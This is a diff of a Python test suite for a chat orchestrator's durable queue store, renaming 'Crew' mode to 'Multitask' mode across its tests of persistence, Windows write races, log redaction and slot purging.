@@ -1,4 +1,4 @@
-"""Tests for Crew Mode (multitask_chat.py): the engineered orchestrator pipeline.
+"""Tests for Multitask Mode (multitask_chat.py): the engineered orchestrator pipeline.
 
 Covers: durable store (queue entry lifecycle, restart reconciliation),
 ingest (ack + queue entry), decision executor (validation, spawn/route/
@@ -25,13 +25,13 @@ from unittest.mock import AsyncMock, MagicMock, patch
 
 import pytest
 
-import junction.multitask_chat as crew_mod
-from junction.multitask_chat import CrewOrchestrator, CrewStore
+import junction.multitask_chat as multitask_mod
+from junction.multitask_chat import MultitaskManager, MultitaskStore
 
 
 @pytest.fixture(autouse=True)
-def _isolate_crew_dir(tmp_path, monkeypatch):  # type: ignore[no-untyped-def]
-    monkeypatch.setattr(crew_mod, "data_home", lambda: tmp_path)
+def _isolate_multitask_dir(tmp_path, monkeypatch):  # type: ignore[no-untyped-def]
+    monkeypatch.setattr(multitask_mod, "data_home", lambda: tmp_path)
 
 
 def _slot(key: str = "s1", agent: str = "junction") -> MagicMock:
@@ -58,11 +58,11 @@ def _spawn_info(run_id: str, done: bool = False, error: str = "", result: str = 
     return info
 
 
-def _orch(state: MagicMock | None = None, subagents: MagicMock | None = None) -> CrewOrchestrator:
+def _orch(state: MagicMock | None = None, subagents: MagicMock | None = None) -> MultitaskManager:
     state = state or MagicMock()
     subagents = subagents or MagicMock()
     sessions = MagicMock()
-    return CrewOrchestrator(state=state, sessions=sessions, subagents=subagents)
+    return MultitaskManager(state=state, sessions=sessions, subagents=subagents)
 
 
 def _slot_save(side_effect: BaseException | None = None):
@@ -79,16 +79,16 @@ def _slot_save(side_effect: BaseException | None = None):
 
 
 def _durable_store_file(slot_key: str, name: str) -> list[dict[str, Any]]:
-    """Read ONE named store file, WITHOUT building a `CrewStore`.
+    """Read ONE named store file, WITHOUT building a `MultitaskStore`.
 
-    The mechanism the named readers below share. `CrewStore.__init__` reads all
+    The mechanism the named readers below share. `MultitaskStore.__init__` reads all
     three store files, so building one to answer a single-file question also
     opens the two files nothing awaited, and on Windows an open that lands in a
     `Path.replace()` window fails with `PermissionError` — issue #4142. Missing
-    is empty here for the same reason it is in `CrewStore._load`: a file that
+    is empty here for the same reason it is in `MultitaskStore._load`: a file that
     was never written means nothing has been recorded yet.
     """
-    path = crew_mod.data_home() / "crew" / crew_mod._store_name(slot_key) / name
+    path = multitask_mod._store_root() / multitask_mod._store_name(slot_key) / name
     try:
         return json.loads(path.read_text(encoding="utf-8"))
     except FileNotFoundError:
@@ -96,7 +96,7 @@ def _durable_store_file(slot_key: str, name: str) -> list[dict[str, Any]]:
 
 
 def _durable_queue(slot_key: str = "s1") -> list[dict[str, Any]]:
-    """Read one slot's queue file, WITHOUT building a `CrewStore`.
+    """Read one slot's queue file, WITHOUT building a `MultitaskStore`.
 
     Every caller of this asks the same question — "is this queue row on disk
     yet?" — and `queue.json` is the only file the code under test awaits before
@@ -122,24 +122,24 @@ def _durable_forwards(slot_key: str = "s1") -> list[dict[str, Any]]:
 
 
 def _durable_entry(slot_key: str, msg_id: str) -> dict[str, Any] | None:
-    """`CrewStore.entry` against the queue FILE — see :func:`_durable_queue`."""
+    """`MultitaskStore.entry` against the queue FILE — see :func:`_durable_queue`."""
     return next((e for e in _durable_queue(slot_key) if e.get("msg_id") == msg_id), None)
 
 
 # ── store ──
 
 
-class TestCrewStore:
+class TestMultitaskStore:
     def test_add_and_persist_roundtrip(self) -> None:
-        st = CrewStore("s1")
+        st = MultitaskStore("s1")
         e = st.add_msg("hello")
         st.add_topic("t1", "r1", "title", e["msg_id"])
-        st2 = CrewStore("s1")  # fresh load from disk
+        st2 = MultitaskStore("s1")  # fresh load from disk
         assert st2.entry(e["msg_id"])["text"] == "hello"
         assert st2.topic("t1")["active_run_id"] == "r1"
 
     def test_pending_includes_ask_state(self) -> None:
-        st = CrewStore("s1")
+        st = MultitaskStore("s1")
         a = st.add_msg("m1")
         b = st.add_msg("m2")
         a["state"] = "ask"
@@ -150,23 +150,23 @@ class TestCrewStore:
     def test_dots_only_slot_key_is_refused(self, key: str, tmp_path: Path) -> None:
         """A key that sanitizes to nothing but dots must not build a store.
 
-        The sanitizer keeps ``.``, so ``".."`` survives it and ``crew / ".."``
-        is the data home — the store's three files would land beside every
+        The sanitizer keeps ``.``, so ``".."`` survives it and ``multitask /
+        ".."`` is the data home — the store's three files would land beside every
         other product file. ``"..."`` is a legal directory name on POSIX but
         Win32 strips trailing dots from a path segment, so it normalizes to
-        ``crew`` itself: same collision, one platform over. ``"/"`` and
+        ``multitask`` itself: same collision, one platform over. ``"/"`` and
         ``"..\\"`` fold to ``_`` and ``__`` and are legitimate names, so they
         are here as the boundary of the rule rather than as rejections.
         """
         expect_refusal = not key.strip(".")
         if expect_refusal:
-            with pytest.raises(ValueError, match="unsafe crew slot key"):
-                CrewStore(key)
+            with pytest.raises(ValueError, match="unsafe multitask slot key"):
+                MultitaskStore(key)
         else:
-            assert CrewStore(key).dir.parent == tmp_path / "crew"
+            assert MultitaskStore(key).dir.parent == tmp_path / "multitask"
         # Nothing was written outside the per-slot directory either way.
         assert not (tmp_path / "queue.json").exists()
-        assert not (tmp_path / "crew" / "queue.json").exists()
+        assert not (tmp_path / "multitask" / "queue.json").exists()
 
     def test_dot_bearing_keys_that_are_real_names_still_work(self) -> None:
         """Positive control: the rule rejects dots-only, not dots.
@@ -175,7 +175,7 @@ class TestCrewStore:
         which Win32 would strip.
         """
         for key in ("a.b", "..a", "s1"):
-            st = CrewStore(key)
+            st = MultitaskStore(key)
             st.add_msg("hello")
             assert (st.dir / "queue.json").exists()
 
@@ -183,7 +183,7 @@ class TestCrewStore:
 class TestWindowsReplaceWindow:
     """Issue #4142: a store read must not race a store write nothing awaited.
 
-    `CrewStore` publishes each file by writing a temp file and calling
+    `MultitaskStore` publishes each file by writing a temp file and calling
     `Path.replace`. That is atomic on both platforms, but only POSIX makes it
     invisible to a concurrent opener — on Windows the destination is briefly
     unopenable and `open()` fails with `PermissionError` (errno 13), which
@@ -228,7 +228,7 @@ class TestWindowsReplaceWindow:
 
         def read_bytes(self, *a, **k):                # type: ignore[no-untyped-def]
             # Faulted alongside read_text so the emulator stays armed against
-            # the call the store actually makes: ``CrewStore._load`` reads bytes
+            # the call the store actually makes: ``MultitaskStore._load`` reads bytes
             # through ``read_bytes_with_retry`` (#4331). Patching only read_text
             # would leave the positive control below passing vacuously — it
             # would observe no failure because it never intercepted the read,
@@ -265,7 +265,7 @@ class TestWindowsReplaceWindow:
             # working and not an emulator that never armed.
             assert inflight, "no unawaited write is in flight — window missed"
             try:
-                CrewStore("winrace")
+                MultitaskStore("winrace")
             except RuntimeError as exc:
                 control.append(str(exc))
 
@@ -296,15 +296,15 @@ class TestWindowsReplaceWindow:
         # today even a whole-store read there happens to be safe — no product
         # path can open this window. But the only write that path PROMISES is
         # its own forward: if the barrier ever narrows to name that write
-        # (the `CrewStore.wait_for` shape, already the majority in
-        # `multitask_chat.py`), a reader widened back to `CrewStore(...)` is the
+        # (the `MultitaskStore.wait_for` shape, already the majority in
+        # `multitask_chat.py`), a reader widened back to `MultitaskStore(...)` is the
         # #4142 race again, visible only as an intermittent red Windows shard.
         # So the window is opened here in the harness instead: `forwards.json`
         # durable and awaited — the same ordering the product path keeps — and
         # the two files nothing there promises parked mid-replace.
         inflight, gate = self._emulate_windows_replace(
             monkeypatch, "topics.json", "queue.json")
-        st = CrewStore("winrace")
+        st = MultitaskStore("winrace")
         st.add_forward("the result body")
         await st.wait_writes()      # the product's promise: the forward is on disk
         try:
@@ -326,7 +326,7 @@ class TestWindowsReplaceWindow:
             # the pass above is the single-file read working and not an
             # emulator that never armed.
             with pytest.raises(RuntimeError, match=r"queue\.json|topics\.json"):
-                CrewStore("winrace")
+                MultitaskStore("winrace")
         finally:
             # Release the parked writes AND join them, for the same reason the
             # queue test does: an executor thread left straddling this
@@ -422,11 +422,11 @@ class TestIngest:
         `save()` writes that emptiness over the real file, erasing pending
         requests and undelivered forwards. A missing file is still empty.
         """
-        st = CrewStore("s1")
+        st = MultitaskStore("s1")
         st.add_msg("do not lose me")
         (st.dir / "queue.json").write_text("{ this is not json", encoding="utf-8")
         with pytest.raises(RuntimeError, match="unreadable"):
-            CrewStore("s1")
+            MultitaskStore("s1")
         # The refusal is the point: the damaged bytes are still there to salvage.
         assert (st.dir / "queue.json").read_text(encoding="utf-8") == "{ this is not json"
         # A file that was never written is a legitimate empty store.
@@ -440,7 +440,7 @@ class TestIngest:
         fails: the caller sees a failure and rolls memory back, but the request
         is already durable and the next restart replays it.
         """
-        st = CrewStore("s1")
+        st = MultitaskStore("s1")
         st.add_topic("t1", "r1", "title", "m0")
         written: list[str] = []
         real_save = st._save
@@ -478,7 +478,7 @@ class TestIngest:
     async def test_dispatch_warms_the_agent_cache_before_spawning(self) -> None:
         """`spawn()` validates the agent from a cache-only read, so an unwarmed
         cache REFUSES a project agent that exists. The dashboard's own spawn
-        endpoint pairs the two; crew dispatch must too, and in that order."""
+        endpoint pairs the two; topic dispatch must too, and in that order."""
         subagents = MagicMock()
         order: list[str] = []
         subagents.spawn = MagicMock(
@@ -518,7 +518,7 @@ class TestIngest:
         # Same text, same treatment, on the two paths that persist it.
         assert secret not in (st.topic("r1") or {}).get("digest", "")
         await orch._store("s1").wait_writes()      # reads below are ON-DISK
-        assert not any(secret in f.get("body", "") for f in CrewStore("s1").forwards)
+        assert not any(secret in f.get("body", "") for f in MultitaskStore("s1").forwards)
 
     @pytest.mark.asyncio
     async def test_single_flight_folds_reentry(self) -> None:
@@ -780,15 +780,15 @@ class TestAnswerMarking:
     the UI can keep them out of the reasoning-collapse pane after a reload."""
 
     @pytest.mark.parametrize("kind,expect_marker", [
-        ("crew_result", True), ("crew_meta", True), ("crew_ask", True),
-        ("crew_ack", False), ("crew", False),
+        ("multitask_result", True), ("multitask_meta", True), ("multitask_ask", True),
+        ("multitask_ack", False), ("multitask", False),
     ])
     def test_answer_kinds_carry_the_marker_class(self, kind: str, expect_marker: bool) -> None:
         orch = _orch()
         slot = _slot()
         orch._post(slot, "body", kind=kind)
         cls = slot.append.call_args.args[2]
-        assert ("crew-reply" in cls) is expect_marker
+        assert ("multitask-reply" in cls) is expect_marker
         assert cls.startswith("msg msg-a")
 
     def test_the_durable_copy_carries_the_window_rows_id(self) -> None:
@@ -802,8 +802,8 @@ class TestAnswerMarking:
             "content": "an answer",
             "meta": {"mid": "m-feedfacefeedface"},
         }
-        with patch.object(crew_mod, "append_if_absent_off_loop") as durable:
-            assert orch._post(slot, "an answer", kind="crew_result") is True
+        with patch.object(multitask_mod, "append_if_absent_off_loop") as durable:
+            assert orch._post(slot, "an answer", kind="multitask_result") is True
         assert durable.call_args.kwargs["mid"] == "m-feedfacefeedface", (
             "the durable copy did not carry the window row's id"
         )
@@ -859,18 +859,18 @@ class TestGptRoundThirteen:
         # This is why patching one channel per round kept leaving another.
         orch = _orch()
         slot = _slot()
-        orch._post(slot, "an answer", kind="crew_result")
+        orch._post(slot, "an answer", kind="multitask_result")
         meta = slot.append.call_args.kwargs.get("meta")
-        assert isinstance(meta, dict) and meta.get("crew_reply") is True, \
+        assert isinstance(meta, dict) and meta.get("multitask_reply") is True, \
             "the durable marker is missing from assistant meta"
         frame = orch._state.broadcast_ws.call_args.args[1]
-        assert (frame.get("meta") or {}).get("crew_reply") is True
+        assert (frame.get("meta") or {}).get("multitask_reply") is True
 
     def test_the_ack_carries_no_marker_in_meta(self) -> None:
         orch = _orch()
         slot = _slot()
-        orch._post(slot, "On it.", kind="crew")
-        assert not (slot.append.call_args.kwargs.get("meta") or {}).get("crew_reply")
+        orch._post(slot, "On it.", kind="multitask")
+        assert not (slot.append.call_args.kwargs.get("meta") or {}).get("multitask_reply")
 
     @pytest.mark.asyncio
     async def test_held_queue_drains_even_when_forwarding_fails(self) -> None:
@@ -909,11 +909,11 @@ class TestGptRoundThirteen:
             raise OSError("history lock contention")
 
         with patch.object(orch, "_post", return_value=True), \
-                patch.object(crew_mod, "append_if_absent_off_loop",
+                patch.object(multitask_mod, "append_if_absent_off_loop",
                              return_value=asyncio.ensure_future(_never_lands())), \
                 _slot_save(side_effect=OSError("history lock contention")):
             orch._last_transcript_write = asyncio.ensure_future(_never_lands())
-            ok = await orch._post_durable(_slot(), "body", kind="crew_result")
+            ok = await orch._post_durable(_slot(), "body", kind="multitask_result")
         assert ok is False, "a failed durable append must not report success"
         assert landed == []
 
@@ -936,7 +936,7 @@ class TestGptRoundThirteen:
                 _slot_save(side_effect=OSError("history lock contention")):
             await orch._queue_forward(slot, "result body")
         await orch._store("s1").wait_writes()
-        assert [f["body"] for f in CrewStore("s1").forwards] == ["result body"], \
+        assert [f["body"] for f in MultitaskStore("s1").forwards] == ["result body"], \
             "the forward was cleared even though its transcript row never landed"
 
     @pytest.mark.asyncio
@@ -947,7 +947,7 @@ class TestGptRoundThirteen:
         slot = _slot()
         with patch.object(orch, "_post", return_value=True), _slot_save() as save:
             orch._last_transcript_write = None
-            assert await orch._post_durable(slot, "body", kind="crew_result") is True
+            assert await orch._post_durable(slot, "body", kind="multitask_result") is True
         save.assert_awaited_once()
 
     @pytest.mark.asyncio
@@ -966,7 +966,7 @@ class TestGptRoundThirteen:
         )
         with _slot_save():
             task = asyncio.ensure_future(
-                orch._post_durable(_slot(), "body", kind="crew_result")
+                orch._post_durable(_slot(), "body", kind="multitask_result")
             )
             await asyncio.sleep(0.05)
             in_flight = not task.done()
@@ -990,7 +990,7 @@ class TestGptRoundThirteen:
         orch._state.conversation_log.append_if_absent.return_value = None  # skipped
 
         with _slot_save(side_effect=OSError("history lock contention")) as save:
-            ok = await orch._post_durable(slot, "same body", kind="crew_result")
+            ok = await orch._post_durable(slot, "same body", kind="multitask_result")
         assert save.await_count == 1, (
             "the repeated body was never force-persisted — a content-deduped "
             "append cannot prove this row is on disk"
@@ -1006,7 +1006,7 @@ class TestGptRoundEleven:
         # `_reconcile` legitimately stays on the loop (it posts and schedules),
         # but its per-entry state.json reads scale with the queue — a restart
         # with many accepted entries stalled the loop one stat() at a time.
-        st = CrewStore("evid1")
+        st = MultitaskStore("evid1")
         for i in range(4):
             e = st.add_msg(f"task {i}")
             e["state"] = "accepted"
@@ -1023,7 +1023,7 @@ class TestGptRoundEleven:
         orch = _orch()
         orch._subagents.get = MagicMock(return_value=None)
         orch._state.get_slot = MagicMock(return_value=None)
-        with patch.object(crew_mod, "read_state", side_effect=_tracking_read):
+        with patch.object(multitask_mod, "read_state", side_effect=_tracking_read):
             await orch._store_async("evid1")
         assert seen, "no durable lookup happened"
         assert all(nm != threading.main_thread().name for nm in seen), \
@@ -1035,7 +1035,7 @@ class TestGptRoundEleven:
         # the filesystem again would put the same reads back on the loop.
         orch = _orch()
         orch._subagents.get = MagicMock(return_value=None)
-        with patch.object(crew_mod, "read_state") as rs:
+        with patch.object(multitask_mod, "read_state") as rs:
             assert orch._run_started("r1", {"r1": True}) is True
             assert orch._run_started("r2", {"r2": False}) is False
         rs.assert_not_called()
@@ -1069,9 +1069,9 @@ class TestGptRoundEleven:
 
         from junction.dashboard import chat_handlers
         src = inspect.getsource(chat_handlers.api_chat)
-        crew_branch = src.split('getattr(slot, "mode", "") == "crew"', 1)[1][:600]
-        assert "_crew.ingest(" in crew_branch
-        assert 'slot.append("user"' not in crew_branch, \
+        multitask_branch = src.split('getattr(slot, "mode", "") == SLOT_MODE_MULTITASK', 1)[1][:600]
+        assert "_multitask.ingest(" in multitask_branch
+        assert 'slot.append("user"' not in multitask_branch, \
             "api_chat appends the user message again — ingest already does it"
 
 
@@ -1081,16 +1081,16 @@ class TestGptRoundNine:
     @pytest.mark.asyncio
     async def test_has_live_work_does_not_build_a_store_on_the_loop(self) -> None:
         # It is called from the async mode-switch handler, and its cold path used
-        # `CrewStore(slot_key)` directly — three JSON parses on the loop.
+        # `MultitaskStore(slot_key)` directly — three JSON parses on the loop.
         seen: list[str] = []
-        real_init = CrewStore.__init__
+        real_init = MultitaskStore.__init__
 
         def _tracking_init(self, slot_key):          # type: ignore[no-untyped-def]
             seen.append(threading.current_thread().name)
             real_init(self, slot_key)
 
         orch = _orch()
-        with patch.object(CrewStore, "__init__", _tracking_init):
+        with patch.object(MultitaskStore, "__init__", _tracking_init):
             await orch.has_live_work("cold1")
         assert seen, "no store was built"
         assert seen[0] != threading.main_thread().name, \
@@ -1113,16 +1113,16 @@ class TestGptRoundNine:
         # re-dispatch a task which may already have mutated something.
         orch = _orch()
         orch._subagents.get = MagicMock(return_value=None)
-        with patch.object(crew_mod, "read_state", return_value=None), \
-                patch.object(crew_mod, "_agent_dir") as ad:
+        with patch.object(multitask_mod, "read_state", return_value=None), \
+                patch.object(multitask_mod, "_agent_dir") as ad:
             ad.return_value.exists.return_value = True      # the run DOES exist
             assert orch._run_started("corrupt1") is True
 
     def test_a_positively_absent_run_dir_reopens(self) -> None:
         orch = _orch()
         orch._subagents.get = MagicMock(return_value=None)
-        with patch.object(crew_mod, "read_state", return_value=None), \
-                patch.object(crew_mod, "_agent_dir") as ad:
+        with patch.object(multitask_mod, "read_state", return_value=None), \
+                patch.object(multitask_mod, "_agent_dir") as ad:
             ad.return_value.exists.return_value = False     # never dispatched
             assert orch._run_started("gone1") is False
 
@@ -1133,9 +1133,9 @@ class TestGptRoundNine:
         from junction.history import ConversationLog
         log = ConversationLog(tmp_path)
         log.append("dashboard:s1", "assistant", "an answer",
-                   cls="msg msg-a crew-reply")
+                   cls="msg msg-a multitask-reply")
         rows = log.read_messages("dashboard:s1")
-        assert any("crew-reply" in (r.get("cls") or "") for r in rows), \
+        assert any("multitask-reply" in (r.get("cls") or "") for r in rows), \
             "the durable copy lost the marker"
 
     def test_an_unmarked_message_writes_no_cls_field(self, tmp_path) -> None:  # type: ignore[no-untyped-def]
@@ -1154,14 +1154,14 @@ class TestColdStoreLoadsOffLoop:
     @pytest.mark.asyncio
     async def test_a_cold_store_is_built_in_the_executor(self) -> None:
         seen: list[str] = []
-        real_init = CrewStore.__init__
+        real_init = MultitaskStore.__init__
 
         def _tracking_init(self, slot_key):          # type: ignore[no-untyped-def]
             seen.append(threading.current_thread().name)
             real_init(self, slot_key)
 
         orch = _orch()
-        with patch.object(CrewStore, "__init__", _tracking_init):
+        with patch.object(MultitaskStore, "__init__", _tracking_init):
             st = await orch._store_async("s1")
         assert st is not None
         assert seen, "the store was never built"
@@ -1172,7 +1172,7 @@ class TestColdStoreLoadsOffLoop:
     async def test_a_cached_store_needs_no_executor_hop(self) -> None:
         orch = _orch()
         first = await orch._store_async("s1")
-        with patch.object(CrewStore, "__init__", side_effect=AssertionError("rebuilt")):
+        with patch.object(MultitaskStore, "__init__", side_effect=AssertionError("rebuilt")):
             again = await orch._store_async("s1")
         assert again is first
 
@@ -1189,25 +1189,25 @@ class TestColdStoreLoadsOffLoop:
 class TestGptRoundSeven:
     """The four blocking findings from the review of b58ead343."""
 
-    def test_the_live_frame_carries_the_crew_reply_marker(self) -> None:
+    def test_the_live_frame_carries_the_multitask_reply_marker(self) -> None:
         # The marker went into the PERSISTED cls so it would survive a reload —
         # but the ws frame omitted it, so it worked ONLY after a reload and a
-        # live crew answer was still collapsed into "Worked through N steps".
+        # live multitask answer was still collapsed into "Worked through N steps".
         # The store reducer reads `cls` off the payload, so it must ride along.
         orch = _orch()
         slot = _slot()
-        orch._post(slot, "an answer", kind="crew_result")
+        orch._post(slot, "an answer", kind="multitask_result")
         frame = orch._state.broadcast_ws.call_args.args[1]
-        assert "crew-reply" in frame.get("cls", ""), "live frame lost the marker"
+        assert "multitask-reply" in frame.get("cls", ""), "live frame lost the marker"
         # And the persisted copy still carries it (both paths, one value).
-        assert "crew-reply" in slot.append.call_args.args[2]
+        assert "multitask-reply" in slot.append.call_args.args[2]
 
     def test_the_ack_frame_is_not_marked(self) -> None:
         orch = _orch()
         slot = _slot()
-        orch._post(slot, "On it.", kind="crew")
+        orch._post(slot, "On it.", kind="multitask")
         frame = orch._state.broadcast_ws.call_args.args[1]
-        assert "crew-reply" not in frame.get("cls", "")
+        assert "multitask-reply" not in frame.get("cls", "")
 
     @pytest.mark.asyncio
     async def test_an_unparseable_decision_is_redacted_before_logging(self, caplog) -> None:  # type: ignore[no-untyped-def]
@@ -1226,25 +1226,25 @@ class TestGptRoundSeven:
             return "{broken json, credential: " + secret + "}"
 
         with caplog.at_level(logging.WARNING):
-            with patch.object(crew_mod, "run_bg_oneliner", side_effect=_bad_json):
+            with patch.object(multitask_mod, "run_bg_oneliner", side_effect=_bad_json):
                 await orch._decide_once(slot)
         assert caplog.text, "the parse failure must still be logged"
         assert secret not in caplog.text, "raw model output leaked into the log"
 
     def test_the_log_redactor_withholds_rather_than_leaks(self) -> None:
-        out = CrewOrchestrator._safe_for_log("token: AKIAIOSFODNN7EXAMPLE")
+        out = MultitaskManager._safe_for_log("token: AKIAIOSFODNN7EXAMPLE")
         assert "AKIAIOSFODNN7EXAMPLE" not in out
 
     def test_redaction_failure_withholds_rather_than_leaks(self) -> None:
-        with patch.object(crew_mod, "redact_credentials", side_effect=RuntimeError("boom")):
-            out = CrewOrchestrator._safe_for_log("token: AKIAIOSFODNN7EXAMPLE")
+        with patch.object(multitask_mod, "redact_credentials", side_effect=RuntimeError("boom")):
+            out = MultitaskManager._safe_for_log("token: AKIAIOSFODNN7EXAMPLE")
         assert "AKIAIOSFODNN7EXAMPLE" not in out
 
     @pytest.mark.asyncio
     async def test_a_temporary_slot_does_not_leak_memory_into_subagents(self) -> None:
         # `blocks_reads` (temporary memory mode) blocks memory-context injection.
-        # chat_runner passes it on the main path; crew dispatch must too, or a
-        # temporary crew slot injects stored memory and lessons into every run.
+        # chat_runner passes it on the main path; topic dispatch must too, or a
+        # temporary multitask slot injects stored memory and lessons into every run.
         orch = _orch()
         slot = _slot()
         slot.blocks_reads = True
@@ -1275,14 +1275,14 @@ class TestGptRoundSeven:
         # inline delayed readiness and stalled every other loop activity.
         orch = _orch()
         with patch.object(orch, "_resume_all", new=AsyncMock()) as ra:
-            with patch.object(crew_mod.asyncio, "get_running_loop") as grl:
+            with patch.object(multitask_mod.asyncio, "get_running_loop") as grl:
                 orch.resume_persisted_slots()
                 grl.return_value.create_task.assert_called_once()
         assert not ra.await_count, "the work must be scheduled, not awaited inline"
 
     def test_resumption_without_a_loop_is_survivable(self) -> None:
         orch = _orch()
-        with patch.object(crew_mod.asyncio, "get_running_loop", side_effect=RuntimeError):
+        with patch.object(multitask_mod.asyncio, "get_running_loop", side_effect=RuntimeError):
             orch.resume_persisted_slots()      # must not raise
 
 
@@ -1294,7 +1294,7 @@ class TestRestartResumesWork:
         # The evidence of the bug was: ack, then silence forever. `_store` only
         # reconciles on first touch and nothing touched it until a NEW message
         # arrived, so the acknowledged request was never looked at again.
-        st = CrewStore("s1")
+        st = MultitaskStore("s1")
         st.add_msg("do the thing")
         st.save()
         await st.wait_writes()
@@ -1308,7 +1308,7 @@ class TestRestartResumesWork:
 
     @pytest.mark.asyncio
     async def test_a_persisted_forward_is_redelivered(self) -> None:
-        st = CrewStore("s1")
+        st = MultitaskStore("s1")
         st.add_forward("a result nobody saw")
         st.save()
         await st.wait_writes()
@@ -1322,7 +1322,7 @@ class TestRestartResumesWork:
 
     @pytest.mark.asyncio
     async def test_an_idle_slot_is_not_resumed(self) -> None:
-        st = CrewStore("s1")
+        st = MultitaskStore("s1")
         e = st.add_msg("already handled")
         e["state"] = "done"
         st.save()
@@ -1348,7 +1348,7 @@ class TestDeliveryFailureKeepsTheResult:
         with patch.object(orch, "_post", return_value=False):
             await orch._queue_forward(slot, "result body")
         await orch._store("s1").wait_writes()      # reads below are ON-DISK
-        assert [f["body"] for f in CrewStore("s1").forwards] == ["result body"]
+        assert [f["body"] for f in MultitaskStore("s1").forwards] == ["result body"]
 
     @pytest.mark.asyncio
     async def test_a_successful_post_still_clears(self) -> None:
@@ -1357,7 +1357,7 @@ class TestDeliveryFailureKeepsTheResult:
         with patch.object(orch, "_post", return_value=True):
             await orch._queue_forward(slot, "result body")
         await orch._store("s1").wait_writes()
-        assert CrewStore("s1").forwards == []
+        assert MultitaskStore("s1").forwards == []
 
     @pytest.mark.asyncio
     async def test_drain_keeps_what_it_could_not_deliver(self) -> None:
@@ -1381,7 +1381,7 @@ class TestWriteBarrier:
         # The barrier used to discard futures via a done-callback, so a write
         # that failed FAST vanished from the set before `wait_writes` snapshotted
         # it and the barrier reported success for a write that never landed.
-        st = CrewStore("s1")
+        st = MultitaskStore("s1")
         st.add_msg("something to persist")
         with patch.object(Path, "write_text", side_effect=OSError("disk full")):
             st.save()
@@ -1393,7 +1393,7 @@ class TestWriteBarrier:
 
     @pytest.mark.asyncio
     async def test_a_successful_write_is_reaped(self) -> None:
-        st = CrewStore("s1")
+        st = MultitaskStore("s1")
         st.save()
         await st.wait_writes()
         st.save()
@@ -1435,7 +1435,7 @@ class TestGptRoundFive:
         slot = _slot()
         posted: list[str] = []
 
-        async def _record(_slot, content, kind="crew"):  # type: ignore[no-untyped-def]
+        async def _record(_slot, content, kind="multitask"):  # type: ignore[no-untyped-def]
             posted.append(content)
             return True
 
@@ -1471,7 +1471,8 @@ class TestGptRoundFive:
         assert once.await_count == 0, "a decision pass ran during teardown"
 
         # A truthy-but-not-True attribute (a MagicMock's auto-created one) must NOT
-        # mute a healthy gateway, or every test double would silently disable crew.
+        # mute a healthy gateway, or every test double would silently disable
+        # multitask mode.
         orch._subagents._shutting_down = MagicMock()
         assert orch._teardown_started() is False
 
@@ -1491,7 +1492,7 @@ class TestGptRoundFive:
         slot = _slot()
         posted: list[str] = []
 
-        async def _record(_slot, content, kind="crew"):  # type: ignore[no-untyped-def]
+        async def _record(_slot, content, kind="multitask"):  # type: ignore[no-untyped-def]
             posted.append(content)
             return True
 
@@ -1511,8 +1512,8 @@ class TestGptRoundFive:
         """A persisted forward is undelivered WORK, not a finished record.
 
         A subagent that completes with the tab closed writes its result here
-        instead of posting it, and the ONLY thing that flushes it is a later crew
-        ingest. So a slot that resumed and switched modes before sending again left
+        instead of posting it, and the ONLY thing that flushes it is a later
+        multitask ingest. So a slot that resumed and switched modes before sending again left
         the answer on disk with no reader -- regular chat has no forward-draining
         step, and the user never learns the request finished.
         """
@@ -1521,18 +1522,18 @@ class TestGptRoundFive:
         done = st.add_msg("finished while the tab was closed")
         done["state"] = "done"        # nothing in the QUEUE is live any more
         st.add_forward("Here is the answer you never saw.")
-        await CrewStore.wait_for(st.save())
+        await MultitaskStore.wait_for(st.save())
         assert await orch.has_live_work("s1") is True, (
             "the mode switch would have discarded an undelivered result"
         )
         # And it stops being live once the forward is delivered and cleared.
         st.remove_forwards({f["fid"] for f in st.forwards})
-        await CrewStore.wait_for(st.save())
+        await MultitaskStore.wait_for(st.save())
         assert await orch.has_live_work("s1") is False
 
     @pytest.mark.asyncio
-    async def test_a_permanent_delete_cancels_and_purges_crew(self) -> None:
-        """Crew persists independently of the transcript, so deleting a
+    async def test_a_permanent_delete_cancels_and_purges_multitask(self) -> None:
+        """A multitask store persists independently of the transcript, so deleting a
         conversation left its durable queue -- the user's own request texts -- on
         disk and its dispatched subagents still running. Cancel BEFORE forgetting:
         the reverse order leaves a live subagent writing into a store nobody
@@ -1543,7 +1544,7 @@ class TestGptRoundFive:
         orch = _orch(subagents=subagents)
         st = orch._store("s1")
         st.add_msg("something private")
-        await CrewStore.wait_for(st.save())
+        await MultitaskStore.wait_for(st.save())
         store_dir = st.dir
         assert (store_dir / "queue.json").exists()
         orch._owned["rA"] = "s1"
@@ -1578,7 +1579,7 @@ class TestGptRoundFive:
         settled = st.add_msg("long finished")
         settled["state"] = "done"
         settled["dispatch_id"] = "d-done"
-        await CrewStore.wait_for(st.save())
+        await MultitaskStore.wait_for(st.save())
 
         await orch.purge_slot("s1")
 
@@ -1589,7 +1590,7 @@ class TestGptRoundFive:
     async def test_a_purge_does_no_store_io_on_the_loop(self) -> None:
         """Reading an UNCACHED store is a mkdir plus three JSON parses, so doing it
         inline froze chats and heartbeats for as long as the filesystem took. And a
-        slot that never ran crew work must not get a directory created just to
+        slot that never ran multitask work must not get a directory created just to
         delete it."""
         subagents = MagicMock()
         cancelled: list[str] = []
@@ -1599,7 +1600,7 @@ class TestGptRoundFive:
         e = st.add_msg("dispatched before the tab closed")
         e["state"] = "claimed"
         e["dispatch_id"] = "d-cold"
-        await CrewStore.wait_for(st.save())
+        await MultitaskStore.wait_for(st.save())
         orch._stores.pop("cold", None)   # uncached: what a delete-after-restart hits
 
         await orch.purge_slot("cold")
@@ -1608,16 +1609,16 @@ class TestGptRoundFive:
     def test_purge_slot_builds_no_store_inline(self) -> None:
         """Structural: the blocking build must sit in the executor helper, not in
         the coroutine. A behavioural test cannot tell the two apart -- both end up
-        calling CrewStore -- so the check is on where the call is written. Named
+        calling MultitaskStore -- so the check is on where the call is written. Named
         specifically: `purge_slot` also offloads its rmtree, so merely looking for
         `run_in_executor` would pass even with the probe called inline.
         """
-        src = Path(crew_mod.__file__).read_text(encoding="utf-8")
+        src = Path(multitask_mod.__file__).read_text(encoding="utf-8")
         body = src.split("async def purge_slot")[1].split("\n    async def ")[0]
         code = "\n".join(
             ln for ln in body.splitlines() if not ln.lstrip().startswith("#")
         )
-        assert "CrewStore(" not in code, "purge builds a store on the event loop"
+        assert "MultitaskStore(" not in code, "purge builds a store on the event loop"
         assert "run_in_executor(None, _purge_probe" in code, (
             "the probe is not offloaded to the executor"
         )
@@ -1630,7 +1631,7 @@ class TestGptRoundFive:
         the outside and a test that only checked `exists()` at the end passed either
         way.
         """
-        ids, probed = crew_mod._purge_probe("no-store-here")
+        ids, probed = multitask_mod._purge_probe("no-store-here")
         assert ids == []
